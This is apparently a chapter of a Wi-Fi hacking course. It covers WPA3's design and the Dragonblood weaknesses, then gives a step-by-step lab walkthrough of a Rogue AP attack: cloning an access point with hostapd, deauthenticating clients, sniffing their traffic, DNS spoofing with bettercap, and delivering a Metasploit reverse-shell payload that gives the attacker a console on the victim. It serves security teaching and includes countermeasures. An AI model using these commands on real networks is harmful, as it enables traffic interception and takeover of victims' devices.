# Extra: WPA3 and Rogue AP

## Introduction
Before finishing, the operation and possible vulnerabilities of the latest Wi-Fi security protocol to emerge should be discussed. In addition, an extra attack will be covered that imitates an access point so that the client connects to it instead of the legitimate one, thereby facilitating a MITM-type attack. First, the theoretical part related to WPA3 will be detailed, and finally the attack known as Rogue AP will be carried out.

## WPA3 Security Protocol
WPA3 emerged in 2018 as the successor to WPA2, due to the vulnerabilities previously discussed regarding WPA/WPA2 protocols. At the time of this course, it is the most current and secure wireless network security protocol known. In greater detail, the changes compared to WPA2 are: [[42](https://ieeexplore.ieee.org/document/10274082)]
- **Replacement of the PSK with SAE:**
  SAE is a new authentication mechanism that seeks to replace the one provided by WPA/WPA2 through the pre-shared key, due to its vulnerability to dictionary attacks. This algorithm is based on the secure key exchange standard Dragonfly Key Exchange, making it difficult for attackers to try massive numbers of passwords.

- **OWE:**
  For the first time in open networks (without the need to enter keys), a private channel is established with each user to encrypt the information they transmit, preventing malicious users from seeing the data exchanged by other users on the same network.

- **Forward Secrecy:**
  WPA3 prevents those who have captured a master key from using it to decrypt information from a session other than the one to which that key belongs.

- **Enterprise Enhancements:**
  Security in the Enterprise version, mostly intended for environments that require high security, is also improved with WPA3. This new encryption allows the consistent use of 192-bit keys throughout the network, as well as the use of robust encryption and integrity protection algorithms such as AES-GCM-256 and SHA-384.

### Vulnerabilities 
Despite all these improvements, WPA3 has some vulnerabilities that were exploited in 2019 by the set of attacks known as Dragonblood:
- **Downgrade Attack:** [[42](https://ieeexplore.ieee.org/document/10274082)]
  This type of attack is based on tricking the device implementing WPA3 into using a lower-security protocol such as WPA2.
- **Side-Channel Timing Attacks:**
  Allows an attacker to learn part of the SAE key due to a poor implementation of this algorithm. It is based on the operations SAE solves to determine whether an ECC point is valid or not, so these implementations take a different amount of time when it is valid than when it is not, which is exploited by this type of attack.
- **Cache-based Side-Channel Attacks:**
  Takes advantage of environments where the attacker shares the CPU (such as virtual machines), so that by observing the CPU cache it may be possible to extract cryptographic patterns from the SAE implementation.

### Countermeasures and recommendations
These types of attacks require specific conditions, which are usually difficult to find or provoke. Therefore, WPA3 is still considered a very robust security protocol. Its use is recommended whenever possible, but without neglecting the importance of proper configuration due to how secure it is. It is always important to keep the devices that implement it well configured and updated to prevent conditions unrelated to WPA3 from putting their security at risk.

## Rogue AP
<img width="706" height="599" alt="image" src="https://github.com/user-attachments/assets/446ac8f2-41a0-4214-9c17-c6f36c0dbd2a" />

This attack is based on configuring the attacker’s network card as a Wi-Fi access point that has exactly the same characteristics as the access point it is trying to imitate (mainly MAC and SSID). In this way, it seeks to imitate a specific access point to which the victim in question usually connects (or is already connected). Therefore, by creating this fake access point that imitates the legitimate one, the attacker can take advantage of certain configurations that make it indistinguishable from the original, in such a way that a stronger signal from it makes the victim device connect to the attacker’s device instead of the legitimate one. Another option is to take advantage of the automatic connection to a known network when the victim is outside the range of the legitimate device, but within the range of this fake access point.

In addition, the fake access point must provide access to the Internet or to the regular network to which the device connects in order to prevent the user from noticing, which translates into the ability to steal or alter any information passing through the attacker’s device (MITM). Therefore, the attacker has the ability to carry out, among others, the [`MITM`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#mitm-con-mensajes-en-claro) attacks seen in a previous section.

On the other hand, it is necessary to know the key of the access point to be imitated, since in order to create a fully identical access point and avoid raising suspicion in the user, it must have the same password. In addition, this is necessary in order to take advantage of the automatic connections that we usually have enabled on our devices.

### Attack Process
For this attack, the files that build the lab for [`WPA/WPA2 PSK`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WPA/WPA2-PSK) are taken as the basis, and they are also found in this branch. However, it is strongly recommended to choose whichever branch you want in order to launch the attack, and even try several of them (emphasizing that the [`WPA/WPA2 Enterprise`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WPA/WPA2-RADIUS) branch already performs an attack of this kind, but with a different objective).

As with all previous attacks, the first step is to start the lab and the attacker machine in order to launch the `aircrack-ng` tools that allow us to analyze the victim network:
```bash
# Start the lab
sudo ./launch.sh
docker-compose exec attacker-1 bash
# Inside the attacker machine shell:
airmon-ng start wlan4
airodump-ng wlan4mon
# Remove monitor mode after finishing the scan
airmon-ng stop wlan4mon
```
<img width="905" height="535" alt="image" src="https://github.com/user-attachments/assets/280f33db-ee46-4399-834b-becf0b8266ea" />

`Note:` In this lab, 2 wireless interfaces are used for the attacker in order to use monitor mode (typically `wlan4`) and access point mode (typically `wlan5`) simultaneously.

In this way, it can be seen that we are facing a `WPA2` network with `CCMP`, something easy to imitate using the `hostapd` tool seen previously. Thus, the following `hostapd.conf` file can be created (already loaded on the Kali machine), which attempts to imitate the victim access point as faithfully as possible (but in open form, pretending that we do not know the key):
```bash
# View or modify the file
nano hostapd.conf
```
```ini
# Contents of hostapd.conf assuming we know the key
interface=wlan5
ssid=WPAnetwork
channel=6
hw_mode=g
wpa=2
wpa_passphrase=passw0rd123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```
`Note:` It is assumed that the legitimate access point key has been obtained beforehand.

Before launching this access point, it is necessary to assign an IP address to the attacker’s wireless interface:
```bash
# IP address of the access point (of its wireless interface)
ip addr add 10.5.2.193/26 dev wlan5
```

As well as configure a DHCP service that will issue IP addresses to connected users (a different subnet is used to be able to check which access point we are connected to):
```conf
# DHCP configuration saved in /etc/dhcp/dhcpd.conf
ddns-update-style interim;
ignore client-updates;
authoritative;

subnet 10.5.2.192 netmask 255.255.255.192 {
    range  10.5.2.194 10.5.2.254;                                      # Range of IPs (10.5.2.192/26) to be assigned to connected users
    option subnet-mask 255.255.255.192;                                # Subnet mask used by connected users
    option broadcast-address 10.5.2.255;                               # Broadcast address used by connected users
    option routers 10.5.2.193;                                         # Default gateway used by connected users (access point IP)
    option domain-name-servers 10.5.2.193, 8.8.8.8, 8.8.4.4;           # Default DNS IPs used by connected users

    default-lease-time 21600;                                          # Time in seconds until each connected user's current IP expires
    max-lease-time 43200;
}
```
```bash
# Kill previous DHCP process
pkill dhcpd
# Configure necessary files for DHCP 
touch /var/lib/dhcp/dhcpd.leases
chown root:root /var/lib/dhcp/dhcpd.leases
# Launch DHCP service
dhcpd -cf /etc/dhcp/dhcpd.conf wlan5
```
* `-cf /etc/dhcp/dhcpd.conf`: location of the DHCP configuration file (in this case it could be omitted since it is in the default location).
* `wlan4`: interface on which the DHCP service will be started (the interface acting as the access point).

Now that everything is ready to imitate the legitimate access point, the `hostapd` tool can be launched to create a fake access point identical to it:
```bash
pkill hostapd    # Kill previous hostapd process
hostapd hostapd.conf 
```
* `hostapd.conf`: configuration file that defines the details of the access point.
* `-B`: run in the background (optional but not recommended in this case in order to see when victims connect).

It is now advisable to verify the proper configuration of the new network with `airodump-ng`, where 2 networks with the same SSID should be visible:
```bash
# In another terminal
# Enable monitor mode again if it was disabled
airmon-ng start wlan4
airodump-ng wlan4mon
```
<img width="987" height="202" alt="image" src="https://github.com/user-attachments/assets/6e3f285b-32f0-4915-9b97-c3b8c6707cf3" />

It is also advisable to test the connection using the secondary interface enabled for the attacker (`wlan4`):
```bash
# Stop monitor mode
airmon-ng stop wlan4mon
# Connect to the access point
pkill wpa_supplicant
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
# Request an IP from the DHCP service once connected to the AP
dhclient wlan4
```
```ini
# Contents of wpa_supplicant.conf for connection using the key
# The attacker MAC is also added to ensure it connects to this one
network={
    ssid="WPAnetwork"
    psk="passw0rd123"
    bssid=02:00:00:00:05:00
}
```
<img width="718" height="820" alt="image" src="https://github.com/user-attachments/assets/ee6b57a5-3d34-4a87-90a7-b8136436ee7d" />

`Note:` It is confirmed that it is connected to the attacker access point because both interfaces are in the same network range (`10.5.2.192/26`), which matches the fake access point and not the legitimate one (`10.5.2.129/26`).

Once it has been verified that everything works correctly, we can proceed to use the `aireplay-ng` tool seen in previous attacks in order to deauthenticate the clients of the legitimate access point, making it possible for them to connect to our fake access point:
```bash
# In another terminal (force channel for aireplay)
docker-compose exec attacker-1 bash
airmon-ng start wlan4
airodump-ng -c 6 wlan4mon
# In another terminal 
docker-compose exec attacker-1 bash
aireplay-ng -0 10 -a 02:00:00:00:00:00 wlan4mon
```
- `-0:` deauthentication (attack that forces deauthentications).
- `10:` number of deauthentication messages sent (high enough value to ensure a disconnection for long enough that they connect to the fake AP).
- `-a 02:00:00:00:00:00:` MAC address of the access point.
- `-c 02:00:00:00:02:00:` MAC address of the client to deauthenticate (optional, since in this case it is better to launch it against all of them).
- `wlan4:` name of the interface used.
<img width="859" height="643" alt="image" src="https://github.com/user-attachments/assets/cea6d0d8-0b41-425d-8c05-3a9172f85ecf" />
<img width="852" height="429" alt="image" src="https://github.com/user-attachments/assets/1853b702-796e-41e6-a71f-55871d952e96" />
<img width="914" height="287" alt="image" src="https://github.com/user-attachments/assets/29aa5bfa-b280-4481-84bb-5a0f8f7de0f4" />

`Note:` As in previous attacks, the captured EAPOL messages indicate that an authentication has taken place, possibly on the access point created by the attacker (the `MAC` addresses indicate that this process is against the attacker’s AP).

Once it is seen that some clients are connected, our objective will have been achieved, thus gaining access to the information traversing the access point. In this way, any of the MITM attacks seen in the [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks) chapter could be launched (something that is recommended to try). However, a different attack of the same type (MITM) will be launched in order to verify the usefulness of creating a fake access point that imitates the legitimate one.

Before continuing, it would be advisable to provide Internet access or access to the network to which the legitimate access point is connected in order to make the attack more realistic. For this reason, a connection is made to the legitimate access point (assuming a previous attack such as the one shown in the [`WPA/WPA2 PSK Cracking Lab`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WPA/WPA2-PSK) chapter that allowed the access key to be discovered) from the fake access point. In addition, the following `iptables` rules (firewall rules) are imposed on the latter, allowing traffic to travel from the fake access point to the legitimate one and the rest of the network:
```bash
# Enable packet forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Drop all traffic passing through the machine
iptables -P FORWARD DROP

# Only allow traffic through the created WLAN
iptables -A FORWARD -s 10.5.2.192/26 -d 10.5.2.192/26 -i wlan5 -o wlan5 -j ACCEPT

# Only allow traffic through the wireless network (and masquerade it) to the wired one  
iptables -A FORWARD -s 10.5.2.192/26 -i wlan5 -o wlan4 -j ACCEPT
iptables -A FORWARD -d 10.5.2.192/26 -i wlan4 -o wlan5 -j ACCEPT
iptables -t nat -A POSTROUTING -s 10.5.2.192/26 -o wlan4 -j MASQUERADE

# Allow loopback traffic
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
```

In addition, it is necessary to connect the secondary interface (`wlan4`) to the legitimate access point for everything to work correctly. However, before doing so, it must be verified that `wpa_supplicant.conf` is adapted to connect to the `MAC` address of the access point (`02:00:00:00:00:00`):
```ini
# Contents of wpa_supplicant.conf for connection to the legitimate AP
network={
    ssid="WPAnetwork"
    psk="passw0rd123"
    bssid=02:00:00:00:00:00
}
```
```bash
# Stop monitor mode
airmon-ng stop wlan4mon
# Connect to the access point
pkill wpa_supplicant
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
# Request an IP from the DHCP service once connected to the AP
dhclient wlan4
```
<img width="720" height="796" alt="image" src="https://github.com/user-attachments/assets/9f8ad04f-9c93-4a13-81a8-e0afd0e6fcbd" />

Now, from any of the affected clients, it can be verified that we are on the fake access point with `ifconfig`, showing an IP range of `10.5.2.192/26` instead of the legitimate range `10.5.2.128/26`. In addition, `ping` can be used to verify that the machines on the internal network are still visible thanks to the `iptables` rules recently established on the fake access point:
```bash
# In another terminal (can also be done with another client or destination machine)
docker-compose exec client-2 bash
ifconfig
ping 10.5.2.21
curl 10.5.1.20
```
<img width="761" height="837" alt="image" src="https://github.com/user-attachments/assets/fbedb332-4bbd-4da3-9a5b-7cf6bc153df4" />

It is also possible to inspect the traffic passing through the access point with tools such as `ettercap` or `tcpdump`:
```bash
ettercap -T -i wlan5
tcpdump -i wlan5 -n -vv
```
```bash
# In another terminal
docker-compose exec client-1 bash
curl 10.5.1.21
```
<img width="785" height="709" alt="image" src="https://github.com/user-attachments/assets/c827409e-3919-4f6c-be1e-a4b44d23fd76" />
<img width="721" height="551" alt="image" src="https://github.com/user-attachments/assets/8d581094-2190-4064-8a68-f2cead3d312b" />
<img width="1856" height="837" alt="image" src="https://github.com/user-attachments/assets/a54ca3f6-2352-4937-8d31-ee74e95c0d14" />

`Note:` Run `echo 1 > /proc/sys/net/ipv4/ip_forward` on the attacker machine after enabling `ettercap`, since `ettercap` sometimes disables the `FORWARDING` bit.

Here, for example, it can be seen how it correctly intercepts HTTP traffic established by one of the clients with the organization’s servers.

`Note:` This is similar to an attack with `ettercap` to view plaintext traffic, as seen in [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#mitm-con-mensajes-en-claro).

Thus, it is verified that the attack has been successful, being very difficult for affected users to detect. Therefore, the time has come to launch a MITM attack capable of introducing malware into the affected devices in order to gain control over them. First, a reverse shell (the victim connects to the attacker so that the attacker can execute commands on the victim) will be created as malware with the help of the `msfpayload` tool (part of the Metasploit framework seen previously):
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.5.2.193 LPORT=443 -f elf -o /attacker/exploit.elf
```
* `-p linux/x86/meterpreter/reverse_tcp:` reverse shell for Linux.
* `LHOST=10.5.2.193:` IP address where the attacker will listen for the reverse shell.
* `LPORT=443:` TCP port where the attacker will listen for the reverse shell.
* `-f elf:` Linux executable.
* `-o /attacker/exploit.exe:` file where the malware will be created.

Once the malware has been created, a `metasploit` console must be opened (this has already been used in [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#ataque-con-metasploit)) in order to prepare the attacker machine to listen for reverse shell requests and execute commands on the victim once it connects:
```bash
msfconsole
# Once inside the console
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 10.5.2.193
set LPORT 443
# If you want to see the exploit options in more detail
show options
# Launch the attack 
run
```
<img width="841" height="841" alt="image" src="https://github.com/user-attachments/assets/33445ee0-03a1-481a-928e-5b58657ece12" />
<img width="876" height="491" alt="image" src="https://github.com/user-attachments/assets/63b413a1-5877-4c0d-bba3-26adaecdd9ac" />

In this way, we already have a terminal waiting for a legitimate client to fall into the trap and connect with the reverse shell. However, part of the necessary configuration still remains so that the client’s traffic is diverted, causing the created malware file (`exploit.elf`) to be downloaded and executed. First, a website must be created to deliver this exploit to victims. To do this, Python is used to quickly serve the files in `/var/www/html` when port `80` (`HTTP`) of the attacker is accessed through interface `wlan5` (which is visible as `10.5.2.193` in the `10.5.2.192/26` network provided by the fake access point):
```bash
cd /var/www/html
# Make it downloadable from the root 
cp /attacker/exploit.elf ./index.html
python3 -m http.server 80
```
<img width="590" height="267" alt="image" src="https://github.com/user-attachments/assets/0bccc296-95d9-42bf-9bbb-a5ad4356905c" />

Once the service is launched, the only thing left is to redirect the traffic for `carlos.web.com` (this was also done in the [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks#dns-spoofing-para-robo-de-credenciales) chapter) to the newly created website at `10.5.2.192:80`. However, this time `ettercap` will not be used, since it does not work very well when the victims are located on 2 different interfaces (`wlan4` and `wlan5`). Instead, a similar tool called `bettercap` will be used to perform `DNS Spoofing`, interfering with the domain `carlos.web.com` and changing it to the malicious website.
```bash
# In another terminal (force channel for aireplay)
docker-compose exec attacker-1 bash
# Start the spoofing tool
bettercap -iface wlan5
```
* `-iface:` interface from which it is run (it must be the one hosting the access point so it can see the victims)
```bash
# Once inside (it is advisable to copy them one by one)
net.probe on                            # Active network scan (connected devices can be seen in this case)
net.recon on                            # Active and passive network reconnaissance (it may already have been done in the previous step)
arp.spoof on                            # Poison ARP caches/tables (they force 10.5.2.193 to be gw, although it already is)
set dns.spoof.domains carlos.web.com    # Define the domain that will be intercepted
set dns.spoof.address 10.5.2.193        # Define the IP to which access to the selected domain will be redirected
dns.spoof on                            # Start DNS Spoofing attack
```
<img width="1080" height="446" alt="image" src="https://github.com/user-attachments/assets/972309f4-f82f-47e2-b7a3-77d25fe44928" />

Finally, it can be seen how the malware is downloaded when the mentioned domain is accessed:
```bash
wget http://carlos.web.com/
# In this case it is necessary to execute it manually
chmod +x index.html
./index.html
```
**Client:**
<img width="1788" height="391" alt="image" src="https://github.com/user-attachments/assets/ed95ceac-a03f-4077-a63f-34b4ed9c3042" />
<img width="768" height="99" alt="image" src="https://github.com/user-attachments/assets/d774d290-7c45-4426-9508-f35a6d8bedae" />

**Attacker:**
<img width="625" height="164" alt="image" src="https://github.com/user-attachments/assets/84d5a264-e9ee-4a6f-b704-ab7a2093edf0" />
<img width="994" height="388" alt="image" src="https://github.com/user-attachments/assets/d32ccb39-0590-482d-a084-868ba5585b25" />
<img width="967" height="118" alt="image" src="https://github.com/user-attachments/assets/d03fce93-0070-4546-a474-d667d177c39b" />

`Note:` This attack is possible because the reference in the local cache (`/etc/hosts`) mapping the domain `carlos.web.com` to the IP `10.5.0.20` is commented out.

In this case, it is executed manually, since it is a simplified simulation of a real case intended to observe the dangers posed by fake access points. This shows how we manage to obtain a console on the victim.

Normally, the `Set` tool seen in the [`Attacks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks) chapter would be used to create a clone of a website frequently visited by the victims (their traffic can be observed as shown when testing with `ettercap` and `tcpdump`), which is then complemented with the created malware. This type of action normally returns the legitimate page along with a pop-up that, when accepted, downloads and executes the malware (the acceptance step is necessary, but usually believable):
<img width="670" height="557" alt="image" src="https://github.com/user-attachments/assets/43729f1f-44bb-4180-b35e-4a25462766e3" />

However, in this lab a much simpler adaptation is chosen due to the limitations of the lab.

This highlights the importance of connecting to the correct access point and ignoring others that may look attractive because of their name, such as `MOVISTAR_XXX_PLUS_PLUS` or `MOVISTAR_XXX_6G`, which may belong to a malicious user trying to take advantage of lack of knowledge to perform a MITM attack. In this case, a mistaken connection due to human error, such as the one mentioned, has not been studied, which is more difficult for users to control. Even so, this also reinforces the importance of making the correct security configurations, especially for network administrators in organizations that handle sensitive data.

`Note:` It is recommended to investigate how MITM-type attacks can be carried out under the special conditions of a `Rogue AP` in order to expand the knowledge acquired.

`Hint:` In this case, it is not necessary to specify the victims’ IPs; it is more convenient to use the mode (`ettercap -T -i wlan5`), since working with 2 interfaces on the attacker can complicate the use of `ettercap`. It is also recommended to investigate more deeply other tools such as the one just seen (`bettercap`).

### Countermeasures and Recommendations
As for protections against this attack, it is not enough simply to pay attention to the names of the networks we connect to (unless they are truly suspicious of being fake); stronger measures must be adopted. One good idea would be to avoid the option of connecting automatically to any network, which is not the most convenient in terms of usability, but could help avoid imitation of typical networks (for example, default access point names from telecom providers). On the other hand, it could also be useful to try to limit the coverage area of the device providing the network to the office or home where it is used, so that only those with physical access to that place can reach it. This is not easy at all, but new technologies such as WiFi 6 are moving in that direction.

In contrast, the most realistic option of all is the use of a [`VPN`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/config#vpn) that creates an encrypted and secure network over one that does not necessarily have to be secure. This makes any information users send travel through a secure channel, even if it crosses a network or device that is not secure. Therefore, its use is especially advisable when making communications with sensitive data, while being less necessary in cases such as visiting the local newspaper, for example. Also interesting are the options seen in the [previous chapter](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WPA/WPA2-RADIUS#contramedidas-y-recomendaciones), which consist of reinforcing the configurations that limit the access points to which we connect (especially in larger environments managed by a specialized person).

Finally, the importance of adjusting measures and security level to the needs of each case must be stressed, since in certain situations, such as home environments, an excessively high level of security using Enterprise versions would not make sense, for example. However, in these cases security should not be neglected completely; instead, it is vitally important to enable those configurations that do not compromise usability. In contrast, in the case of companies or organizations, it would make sense to dedicate more time and resources to taking greater care of the security of their networks and devices, even carrying out audits from time to time. As has already been seen, an attacker can do a great deal of damage to a company, its employees, or the clients who trust it with their data. Therefore, it is very important that the security level be adjusted to the needs of each case, especially when dealing with sensitive third-party data.

`Note:` The lab that has been built has much more potential than just being limited to the attacks shown, so its use is strongly recommended in order to continue learning and improving auditor skills. It could even be expanded or adapted to test an attack requiring some special configuration or one not considered here. For that purpose, it is recommended to read the [config](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/config) chapter, where a more detailed view of how the lab was built is intended to be provided.

[`Previous lesson, cracking WPA/WPA2 EAP networks`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/WPA/WPA2-RADIUS)
